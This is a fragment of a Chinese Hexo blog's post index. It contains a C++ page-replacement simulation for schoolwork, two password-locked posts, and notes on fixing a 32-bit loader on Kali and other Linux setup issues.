class="built_in">ord</span>(_ord)&#123;</span><br><span class="line">        lAT = <span class="built_in">clock</span>();</span><br><span class="line">        fAT = lAT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vMemManager</span>&#123;  <span class="comment">// 虚拟内存管理——换页模拟</span></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">const</span> <span class="type">int</span> metaPages = <span class="number">10</span>;   <span class="comment">// 每页10条指令</span></span><br><span class="line">        <span class="type">const</span> <span class="type">int</span> vPages = <span class="number">32</span>;      <span class="comment">// 虚拟页数32</span></span><br><span class="line">        <span class="type">int</span> pPages;             <span class="comment">// 物理内存页数</span></span><br><span class="line">        <span class="type">int</span> acs;        <span class="comment">// 访问次数</span></span><br><span class="line">        <span class="type">int</span> mis;        <span class="comment">// 未命中次数</span></span><br><span class="line">        <span class="type">int</span> curOrd;     <span class="comment">// 出局位序指针</span></span><br><span class="line">        <span class="type">int</span> opId;       <span class="comment">// 指令指针</span></span><br><span class="line">        vector&lt;pMem&gt; pM;</span><br><span class="line">        function&lt;<span class="type">bool</span>(pMem&amp; a, pMem&amp; b)&gt; cmp;   <span class="comment">// 动态赋予的静态函数成员-&gt;函数对象地址</span></span><br><span class="line">        <span class="comment">// priority_queue&lt;pMem*, vector&lt;pMem*&gt;, decltype(cmp)&gt; pvPages;  // 放入物理内存中的虚拟页</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">static</span> vector&lt;<span class="type">int</span>&gt; opSet;   <span class="comment">// 静态指令集</span></span><br><span class="line">        <span class="built_in">vMemManager</span>(<span class="type">int</span> ps,</span><br><span class="line">            function&lt;<span class="built_in">bool</span>(pMem&amp;, pMem&amp;)&gt; _cmp</span><br><span class="line">        ):<span class="built_in">pPages</span>(ps), <span class="built_in">cmp</span>(_cmp), <span class="built_in">acs</span>(<span class="number">0</span>), <span class="built_in">mis</span>(<span class="number">0</span>), <span class="built_in">opId</span>(<span class="number">0</span>), <span class="built_in">curOrd</span>(<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// pM.resize(0);    // resize会调用模板类的空构造函数，若不存在会报错</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getPage</span><span class="params">(<span class="type">int</span> op)</span></span>&#123;    <span class="comment">// 指令的在虚存中的页码</span></span><br><span class="line">            <span class="keyword">return</span> op/metaPages;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getDis</span><span class="params">(<span class="type">int</span> idx)</span></span>&#123;    <span class="comment">// 距离下次访问</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=opId; i&lt;ALL; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">getPage</span>(opSet[i]) == idx)&#123;</span><br><span class="line">                    <span class="keyword">return</span> i-opId;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ALL*<span class="number">2</span>-opId;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">newOrd</span><span class="params">(<span class="type">int</span> n=<span class="number">-1</span>)</span></span>&#123;       <span class="comment">// 新添出局位序————标记相当于后移一轮，由于本身就要后移一轮，因此变成两轮</span></span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">-1</span>) <span class="keyword">return</span> curOrd++;  <span class="comment">// 非置换</span></span><br><span class="line">            curOrd = n+<span class="number">1</span>;   <span class="comment">// 置换</span></span><br><span class="line">            <span class="keyword">return</span> n+<span class="number">2</span>*pPages;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">updateOrd</span><span class="params">(vector&lt;pMem&gt;::iterator _pm)</span></span>&#123;    <span class="comment">//  命中————两轮内的（不包括两轮）可以后移一轮</span></span><br><span class="line">            <span class="keyword">if</span>((_pm-&gt;ord - curOrd) &lt; pPages)&#123;</span><br><span class="line">                _pm-&gt;ord += pPages;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">updateDis</span><span class="params">()</span></span>&#123;   <span class="comment">// 更新距离</span></span><br><span class="line">            <span class="keyword">for</span>(pMem&amp; v : pM)&#123;   <span class="comment">// 迭代更新物理内存中的虚拟页统计</span></span><br><span class="line">                v.dis = <span class="built_in">getDis</span>(v.vIndex);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">nextOp</span><span class="params">()</span></span>&#123;     <span class="comment">// 访问下一指令</span></span><br><span class="line">            acs++;      <span class="comment">// 访问次数增加</span></span><br><span class="line">            <span class="type">int</span> vId = opSet[opId++];</span><br><span class="line">            <span class="type">int</span> tmpP = <span class="built_in">getPage</span>(vId);    <span class="comment">// 获取虚拟页</span></span><br><span class="line">            vector&lt;pMem&gt;::iterator pIt = <span class="built_in">find_if</span>(</span><br><span class="line">                pM.<span class="built_in">begin</span>(), pM.<span class="built_in">end</span>(),</span><br><span class="line">                [tmpP](pMem&amp; _pm)&#123;  <span class="comment">// 虚拟页码对应</span></span><br><span class="line">                    <span class="keyword">return</span> _pm.vIndex == tmpP;</span><br><span class="line">                &#125;</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span>(pIt == pM.<span class="built_in">end</span>())&#123;    <span class="comment">// 不在内存中</span></span><br><span class="line">                mis++;</span><br><span class="line">                <span class="keyword">if</span>(pM.<span class="built_in">size</span>() &lt; pPages)&#123;</span><br><span class="line">                    pM.<span class="built_in">push_back</span>(<span class="built_in">pMem</span>(tmpP, <span class="built_in">getDis</span>(tmpP), <span class="built_in">newOrd</span>()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 置换</span></span><br><span class="line">                    pMem &amp;pm = pM.<span class="built_in">front</span>();</span><br><span class="line">                    pm = <span class="built_in">pMem</span>(tmpP, <span class="built_in">getDis</span>(tmpP), <span class="built_in">newOrd</span>(pm.ord));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 命中</span></span><br><span class="line">                pIt-&gt;aT++;</span><br><span class="line">                <span class="comment">// pIt-&gt;dis=getDis(pIt-&gt;vIndex);</span></span><br><span class="line">                pIt-&gt;lAT=<span class="built_in">clock</span>();</span><br><span class="line">                <span class="built_in">updateOrd</span>(pIt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">updateDis</span>();</span><br><span class="line">            <span class="built_in">sort</span>(pM.<span class="built_in">begin</span>(), pM.<span class="built_in">end</span>(), cmp);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">double</span> <span class="title">tick</span><span class="params">()</span></span>&#123;    <span class="comment">// 模拟换页触发, 返回命中率</span></span><br><span class="line">            <span class="keyword">while</span>(acs&lt;ALL)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;<span class="built_in">nextOp</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>-<span class="built_in">double</span>(mis)/acs;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">randNum</span><span class="params">(<span class="type">int</span> n1, <span class="type">int</span> n2 = <span class="number">-1</span>)</span></span>&#123;    <span class="comment">// [n1, n2) [0, 0) =&gt; [0, 320) [319, 320) =&gt; [0, 320)</span></span><br><span class="line">    <span class="keyword">if</span>(n2 == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n1 == <span class="number">0</span>) n1 = ALL;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">rand</span>()%n1;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(n1 == <span class="number">319</span>) n1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">rand</span>()%(n2-n1)+n1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">nextMid</span><span class="params">(<span class="type">int</span> m)</span></span>&#123;     <span class="comment">// 迭代指令 [0, 319]</span></span><br><span class="line">    <span class="keyword">return</span> (m+<span class="number">1</span>)%ALL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt;&amp; <span class="title">randOperation</span><span class="params">()</span></span>&#123;   <span class="comment">// 生成随机指令序列</span></span><br><span class="line">    <span class="type">static</span> vector&lt;<span class="type">int</span>&gt; p;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>));     <span class="comment">// 初始化</span></span><br><span class="line">    p.<span class="built_in">resize</span>(<span class="number">320</span>);</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>, mid = <span class="number">0</span>;     <span class="comment">// 随机取一条指令</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">80</span>; i++)&#123;</span><br><span class="line">        mid = <span class="built_in">randNum</span>(mid, ALL);</span><br><span class="line">        p[cnt++] = mid;         <span class="comment">// 随机后地址</span></span><br><span class="line">        mid = <span class="built_in">nextMid</span>(mid);     </span><br><span class="line">        p[cnt++] = mid;         <span class="comment">// 顺序</span></span><br><span class="line">        mid = <span class="built_in">randNum</span>(mid);</span><br><span class="line">        p[cnt++] = mid;         <span class="comment">// 随机前地址</span></span><br><span class="line">        mid = <span class="built_in">nextMid</span>(mid);</span><br><span class="line">        p[cnt++] = mid;         <span class="comment">// 顺序</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; vMemManager::opSet = <span class="built_in">randOperation</span>();   <span class="comment">// 初始化指令集</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> fifo = [](pMem&amp; a, pMem&amp; b)&#123;     <span class="comment">// 先进先出</span></span><br><span class="line">    <span class="keyword">return</span> a.fAT&lt;b.fAT; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> lru = [](pMem&amp; a, pMem&amp; b)&#123;</span><br><span class="line">    <span class="keyword">return</span> a.lAT==b.lAT?a.fAT&lt;b.fAT:a.lAT&lt;b.lAT;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> opt = [](pMem&amp; a, pMem&amp; b)&#123;</span><br><span class="line">    <span class="keyword">return</span> a.dis==b.dis?a.fAT&lt;b.fAT:a.dis&gt;b.dis;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> lfu = [](pMem&amp; a, pMem&amp; b)&#123;</span><br><span class="line">    <span class="keyword">return</span> a.aT==b.aT?a.fAT&lt;b.fAT:a.aT&lt;b.aT;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> clock_vp = [](pMem&amp; a, pMem&amp; b)&#123;</span><br><span class="line">    <span class="keyword">return</span> a.ord==b.ord?a.fAT&lt;b.fAT:a.ord&lt;b.ord;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\tFIFO\tLRU\tOPT\tLFU\tClock&quot;</span>);   <span class="comment">// field</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">4</span>; i&lt;<span class="number">33</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n%d\t&quot;</span>, i);</span><br><span class="line">        vector&lt;vMemManager&gt; vmSet;</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, fifo));</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, lru));</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, opt));</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, lfu));</span><br><span class="line">        vmSet.<span class="built_in">push_back</span>(<span class="built_in">vMemManager</span>(i, clock_vp));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">5</span>; j++)&#123;</span><br><span class="line">            <span class="type">double</span> hit = vmSet[j].<span class="built_in">tick</span>();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%.1f\%\t&quot;</span>, hit*<span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>Development</category>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Schoolwork</tag>
      </tags>
  </entry>
  <entry>
    <title>ComicCrawling</title>
    <url>/2023/02/21/Development/Project/ComicCrawling/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="4bbaf2424fefe1638a25a109b71da051b115717467f47290e14ffa315faa6cd3"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Development</category>
        <category>Project</category>
      </categories>
  </entry>
  <entry>
    <title>Kali 下的 ld-linux.so.2</title>
    <url>/2023/08/03/Solution/Linux/Kali%20%E4%B8%8B%E7%9A%84%20ld-linux.so.2/</url>
    <content><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>在给Kali安装silentEye时，运行下载得到的”.run”文件时提示报错：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picturebed-1310517892.file.myqcloud.com/202308030041886.png"
                      alt="image-20230803001154850"
                ></p>
<p>明明有这个文件但运行时却找不到。查找资料发现是系统位版本与文件位版本不匹配，分别查看版本：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picturebed-1310517892.file.myqcloud.com/202308030041054.png"
                      alt="image-20230803001312845"
                ></p>
<p>64位的系统所用的加载动态链接库的文件是 <code>/lib64/ld-linux-x86-64.so.2</code> ，这是个软链接，实际上是 <code>/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</code> 文件，直接用该加载器去运行”.run”文件会提示：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/sam/Public/silenteye-0.4.2.beta-ubuntu-12.04.run: error while loading shared libraries: /home/sam/Public/silenteye-0.4.2.beta-ubuntu-12.04.run: wrong ELF class: ELFCLASS32</span><br></pre></td></tr></table></figure></div>

<p>通过 <code>readelf -l silenteye-0.4.2.beta-ubuntu-12.04.run</code> 查看其文件特征会发现他需要 <code>/lib/ld-linux.so.2</code> 这样一个interpreter，猜测这是与前面64位的 <code>ld-linux-x86-64.so.2</code> 对应的文件，所以需要先查找64位文件依赖的包是什么：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">❯ dpkg -S ld-linux-x86-64.so.2</span><br><span class="line">libc6:amd64: /lib64/ld-linux-x86-64.so.2</span><br><span class="line">libc6:amd64: /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br></pre></td></tr></table></figure></div>

<p>该命令查找包含已安装的特定文件的包名称，可以看见是 <code>libc6:amd64</code> ，冒号后的是版本。这是64位linux的系统链接库包。</p>
<p>先打开系统对于32位库的支持，<code>sudo dpkg --print-architecture</code> 可以查看本机支持的架构版本，此处为 <code>amd64</code> ，我们需要打开 <code>i386(即32位)</code>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg --add-architecture i386</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt dist-upgrade</span><br></pre></td></tr></table></figure></div>

<p>然后查看libc6有没有对应i386的包：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">❯ apt search libc6</span><br><span class="line">...</span><br><span class="line">libc6/kali-rolling,now 2.37-5 amd64 [installed]</span><br><span class="line">  GNU C Library: Shared libraries</span><br><span class="line"></span><br><span class="line">libc6-amd64/kali-rolling 2.37-5 i386</span><br><span class="line">  GNU C Library: 64bit Shared libraries <span class="keyword">for</span> AMD64</span><br></pre></td></tr></table></figure></div>

<p>amd64已安装，安装i386的即可（忽略了下面的带”-cross”的glibc包，应该是用于交叉编译的库包，但是不知道适不适用，因此不敢乱下）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install libc6:i386</span><br></pre></td></tr></table></figure></div>

<p>下载完毕后会在 <code>/lib</code> 下发现 <code>ld-linux.so.2</code> 这个文件，对，它就是32位系统的动态链接加载器。再次运行”.run”文件发现可以成功，问题解决！</p>
<hr>
<p>也没完全解决，这个silenteye的安装器不支持kali，因此最后安装失败&#x3D; &#x3D;。</p>
]]></content>
      <categories>
        <category>Solution</category>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>Linux Issues</title>
    <url>/2023/09/28/Solution/Linux/Linux%20Issues/</url>
    <content><![CDATA[<h2 id="Debris"><a href="#Debris" class="headerlink" title="Debris"></a>Debris</h2><ul>
<li><p>CentOS-安装 jdk17：<a class="link"   href="https://blog.csdn.net/chenshm/article/details/124358714" >CentOS安装Jdk17 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>更改 Linux 终端字体：[</p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/90116800%EF%BC%8C" >https://zhuanlan.zhihu.com/p/90116800， <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://blog.csdn.net/starzhou/article/details/105493420" >https://blog.csdn.net/starzhou/article/details/105493420 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>]</p>
</li>
<li><p><code>xargs</code> 工具属于 <code>findutils</code> 包，安装时要装后者。</p>
</li>
<li><p>Linux 只支持 <code>/</code> 做系统路径分割符</p>
</li>
<li><p>运行 bash 脚本时出现如下报错：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">bash: &lt;sth&gt;.sh: /bin/bash^M: bad interpreter: No such file or directory</span><br></pre></td></tr></table></figure></div>

<p>有两种可能：</p>
<ol>
<li>可能是文件开头有误：<code>#!bin/bash</code> &#x3D;&gt; <code>#!/bin/bash</code></li>
<li>可能是文件格式不对，vim 编辑目标 sh 文件，<code>:set ff=unix</code></li>
</ol>
</li>
</ul>
<h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><h3 id="Linux无法挂载ISO9660文件系统"><a href="#Linux无法挂载ISO9660文件系统" class="headerlink" title="Linux无法挂载ISO9660文件系统"></a>Linux无法挂载ISO9660文件系统</h3><p>查看 <code>/proc/filesystems</code> 可以获得所有支持的文件系统，若其中没有iso9660，则加载该模块：<code>sudo modprobe iso9660</code></p>
<h3 id="配置vsftpd的用户目录"><a href="#配置vsftpd的用户目录" class="headerlink" title="配置vsftpd的用户目录"></a>配置vsftpd的用户目录</h3><p><a class="link"   href="https://blog.csdn.net/arnoldlu/article/details/19615435" >vsftpd设置用户目录 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>省流：将ftp用户的家目录全部配置为ftp目录即可。在chroot相关参数全部置为YES的前提下，vsftpd利用配置文件中指定的本地用户登录，登录后直接访问该用户的家目录。通过在”&#x2F;etc&#x2F;passwd”中设置ftp用户的shell为bin&#x2F;nologin可限制ftp用户的权限。</p>
<h3 id="SSH-Jail配置"><a href="#SSH-Jail配置" class="headerlink" title="SSH-Jail配置"></a>SSH-Jail配置</h3><p><a class="link"   href="https://linux.cn/article-8313-1.html" >使用 chroot 监狱限制 SSH 用户访问指定目录 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/yanggd1987/article/details/54310686" >ssh的chroot配置 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>使用root的时候要小心，一不小心删了 <code>/lib</code> 文件linux就直接寄啦</p>
<p><code>ldd /bin/ls | awk &#39;&#123; print $3 &#125;&#39; | grep &quot;/lib&quot; | sort | uniq</code> 筛选ls所需要的链接库文件路径</p>
<h3 id="VMware-桥接模式无法上网问题"><a href="#VMware-桥接模式无法上网问题" class="headerlink" title="VMware 桥接模式无法上网问题"></a>VMware 桥接模式无法上网问题</h3><p>重启网络的最原始手段：<code>/etc/init.d/network-manager restart</code> </p>
<p>参考：<a class="link"   href="https://blog.csdn.net/jacklang/article/details/53170318#:~:text=%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8E%E4%B8%BB%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%80%9A%E8%AE%AF%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%8F%AB%E5%81%9A%20VMware,%E6%A1%A5%E6%8E%A5%E5%8D%8F%E8%AE%AE%EF%BC%88VMware%20Bridge%20protocol%EF%BC%89%EF%BC%8C%E6%89%80%E4%BB%A5%E6%8C%87%E5%AE%9A%E7%9A%84%E7%BD%91%E5%8D%A1%E5%BF%85%E9%A1%BB%E6%94%AF%E6%8C%81%E8%BF%99%E4%B8%AA%E5%8D%8F%E8%AE%AE%EF%BC%8C%E8%BF%99%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E7%BC%96%E8%BE%91%E9%80%82%E9%85%8D%E5%99%A8%E7%9A%84%E5%B1%9E%E6%80%A7%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%9B%B4%E6%94%B9%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA%E3%80%82" >虚拟机 VMware 桥接模式详解（翻译+部分原创） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>简单地说，设置桥接需要固定虚拟机的IP与主机同一网段，DNS服务器与网关则要完全一致，新版的ubuntu的网络配置更换成了netplan而不是教程中常出现的那些文件，因此需要一篇netplan配置教程：<a class="link"   href="https://zhuanlan.zhihu.com/p/46544606" >如何在 Linux 上使用网络配置工具 Netplan <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>但是配置完后仍旧不能出网，主机能ping通虚拟机，但反过来不行，直到看到一篇博客：<a class="link"   href="https://blog.csdn.net/m0_59802268/article/details/124177001?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-124177001-blog-78987312.t5_download_50w&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-124177001-blog-78987312.t5_download_50w&utm_relevant_index=2" >vmware 虚拟机桥接模式连不上网的罕见原因 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。一开始使用的是需要认证的校园网，切换了自己的热点就成功了，确实有够罕见的。</p>
]]></content>
      <categories>
        <category>Solution</category>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>定制与管理</title>
    <url>/2023/07/29/Solution/Custom/%E5%AE%9A%E5%88%B6%E4%B8%8E%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="dba8ef2285ef993e6b742c4b31f3a2d07420a93fe73d311f2576831c64fe7236">93f063693304a79e562da81abee9f022b69db7f51ea2ff5328702d813395c11f484e684f0cf96644a8e28fa77bbec8d51100f0ca6f1fb738e6ef677447fdfa39e72e79da284853e7e9b005571917f2fb2299b3201442f06de7a670fa9a162fef768842f1fc27f895f7ded250110c2f86fe57ad4efd88fc597fb0e7c4f208489c4f20265d3df5e09094ef0c3bf11c7fc67106e961e8b5d02e100b01852ebdcbe16de9a57eb78c2bd86e86fa3940e83e43e38e906d3ebe22395d5a4c03311e1abab55de1b568cd3bc4a13fbf0d43303c77b2295e3a90d7bc35df1770d7d0492f1b13caac6e9c86d0fd87d79fd1770000c285d43d41b19a5338d1d48390bc67b8e5c2dd6386a400920f1ca899e327e0e58c4b7cab6b60f646fc7d6d1e43a3b48a7169dd05c5a430e04b9269ec072b2c7411c04e99480b90f75ef4605958a838385eb62eb76378095489d08d9c213825a9a0fad0c24a17e6520918a5421d967fbb9c6625161a8034adc8b9c9890253ee401f4fb6170aead500b6b0897c4009ec1e9b87cc7314f2e149e47be70863054464f191b04977339a282e4fa374c1f3b33e6ea15c6730e823ba8cf6e1afae361347252cbddfa197fb5ecbb24f412d4d4fb99ec4d209fcb438cc2848e630c5595fad08b4fbcfebfd8d6b273c716298d054ab4c32b8fe4feb0d64aca7ee87b3a9461d214b2e6f42e72f1a2e358817f7fd5bdccafd351b066da0a8b9780b803533a441fb607624504047255180ab39f728fe8d53f9dc6c91e2da6f7f49d4a74a512ce657f36d8567d23b0a7011fe23fcff71e60b1abcc21a2620c121c7f5934acd8b37b6dacc0dded11ab35787c729fff213e61b122f3c3343932721adc02c4a7b3424dedf4876fb3be8bd336520668c58550ba503e425d4162aec3a8e3a3fa190b78600c1910a369a69f1337501ce03d890f4948ad23f0b40dcbd3531976cf228cc3e7723500d14ab2159d1974ce22c706c60a928b55c45fd5e7eac72169a6a68c31a08fb98f56928ac8e365b87b603b824479ae6afd06864d29bddb903d730e5254fb2ff44521d143622b45f60ba83df5ee14f39532744078144f27364cea2e13033ae92ebe48fb49dc077563d6110a24e76d1cf3c84aa5e41363e662f38cc4cf25bc71906532bfe1ee463f3de99f7e69d6370d220211fa7c9c719a13768af4af571ad121c099c02c6d3773f5aaa7b14032a490a89cfc53a6a659a3db288acbc4859eceeb45d992dd9e0b0c25a6b526e4f5a70bc4e97b919cb1faf4c61424a5c497df20f3eb78ec58c02b0faab10837d86dfa95fc5d17dce73348af27d673747f3498654bb2692c500fc043d034a53e04cce9e6ef6bb15836b2362b157e930b788865d4294e65a69d9147b9cfef9e692714da6cdff691288f1ff54743708b6e68916c9e2e813925c181afde470dcb0ad8d4b69df0b27c19b542019ef7dcadb0232616fb4c91a5dca85f56e9d7938e3e825c889f7b25a96c1d384bd395e65f8a75ef862228cd84fb29f2e1c5068e315d46936505e12cf8fae06089eb9f6622af0237a052a499f906186050c25430adc7ce0a62657a549361b26fd6d5586425ba22d84b041b95cbd2a8e852f289824444cf1b7fb66b9933e471cce802bf5104e8605e47caaca0f56d54412d58c9cb64c8650544430b383a5ab53ca216f8bb028bed154d54f1373ee362162529bfd7ff2f0a3cb7928a4e97233948b01f8e9bb5a766bed7e7602dd8601cfcc9d67c15d8b44977716a2effdff10309bd034df3c999858c575004c34e04d7cd5f9fc0785badfe505e084e48979fad0bb4319bf96a841d647c9968c044df556a93e834f15570bb6cc75849f244da4710b15ea5e00701b70deccb7914ad92bc320f62b66313b1aa469d137dcc1e7dd3b5bfece5103a3a11dbc9a8862611e8de6c808006ca70aa7e4b685b7d9b14181867db8373d0bc97f8f2a65328951b60772d629bf0e05210100f4ec2f487c2d015049da6a06edbe77094058c7457e6bc498582efb0013672dc5550640e0722b3ae7a6d0c55a18af751c0446e49c4b2727ea0b8f5f42dbe966a9fed9ee9114c55259cf8eb83f7d4e69335d64aa3abd11083f13c44548630bb75272227ae7452fadccbca72f6d8aad3f300463f22030e3a150cd190df0f7c6167318bb822e1d2829e35eae4a61699ff9fdac62e9f08e5b5589d586cb65b67d0ba4997f71df3ee596b0fa8bd6324cf6b466ab81c16fadbc0be592738761d133cc7468d51932ad0f3e05f1bfa1ac651cf3f84cb4b33e71360db30b156d9ab1e00df564b2d1ae9377d777b8bc0ba748e287164d91ef503e75aac8db57c33a245b455b9167616c45bdc354156f43581f12333475177e5ca70668a0ded03e86795d662275a669de673458207c23dda14cdda16a1e194ca7a20cf3c7013943afe2104c1870de1afd0192e8f7a0aa8d701e44abf3e2fa1245d4fce72a9ee4472953951d4c651cbf5f3b3b4f773351ce04d6d7dac8cf9faa443b3ae38d7646d1c1f6b3f46d4f4b7abd1bba4f920d03a79ad881aa1fb7c30c85c45faced2ce51b8f32c7bede1cd5c4ebc6c82a6fa9d745dc24760d9c4952c48d971443c856a9c38121b5f56385dbd7107843df3788f3118ff559a62ff3c